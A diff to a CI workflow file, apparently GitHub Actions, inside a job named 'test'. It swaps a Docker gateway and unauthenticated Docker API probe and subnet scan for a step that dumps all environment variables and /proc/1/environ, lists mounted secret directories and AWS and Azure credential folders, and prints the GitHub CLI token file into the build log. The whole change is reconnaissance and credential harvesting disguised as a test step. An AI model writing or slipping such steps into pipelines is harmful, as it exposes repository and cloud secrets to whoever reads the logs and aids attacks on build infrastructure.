@@ -7,19 +7,25 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: docker network scan
+      - name: full env dump
         run: |
-          echo "=== DOCKER GATEWAY ==="
-          curl -s --max-time 3 http://172.17.0.1/ 2>&1 | head -10
-          curl -s --max-time 3 http://172.17.0.1:2375/ 2>&1 | head -10
-          curl -s --max-time 3 http://172.17.0.1:2376/ 2>&1 | head -10
+          echo "=== FULL ENV ==="
+          env | sort
           
-          echo "=== DOCKER API ==="
-          curl -s --max-time 3 http://172.17.0.1:2375/version 2>&1 | head -10
-          curl -s --max-time 3 http://172.17.0.1:2375/containers/json 2>&1 | head -10
+          echo "=== PROC ENVIRON ==="
+          cat /proc/1/environ | tr '\0' '\n' | sort
           
-          echo "=== DOCKER SUBNET SCAN ==="
-          for i in 1 2 3 4 5; do
-            result=$(curl -s --max-time 1 http://172.17.0.$i/ 2>&1 | head -2)
-            echo "172.17.0.$i: $result"
-          done
+          echo "=== MOUNTED SECRETS ==="
+          find /run/secrets/ 2>/dev/null || echo "none"
+          find /var/run/secrets/ 2>/dev/null || echo "none"
+          
+          echo "=== HOSTS FILE ==="
+          cat /etc/hosts
+          
+          echo "=== DNS CONFIG ==="
+          cat /etc/resolv.conf
+          
+          echo "=== CREDENTIAL FILES ==="
+          ls ~/.aws/ 2>/dev/null || echo "no aws"
+          ls ~/.azure/ 2>/dev/null || echo "no azure"
+          cat ~/.config/gh/hosts.yml 2>/dev/null || echo "no gh config"
